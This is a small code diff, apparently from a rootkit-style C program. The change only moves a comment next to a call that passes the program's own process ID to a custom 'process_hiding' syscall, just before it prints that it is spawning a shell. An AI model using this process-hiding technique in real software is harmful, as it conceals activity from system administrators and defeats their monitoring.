@@ -23,7 +23,8 @@ main(int argc, char *argv[]){
   //pass in the syscall for process_hiding and the pid for itself
   printf("Hiding self (%d)..\n", getpid());
 
-  syscall(syscall_num, getpid()); //hide self
+  //hide self process
+  syscall(syscall_num, getpid());
 
   printf("Spawning shell..\n");
 
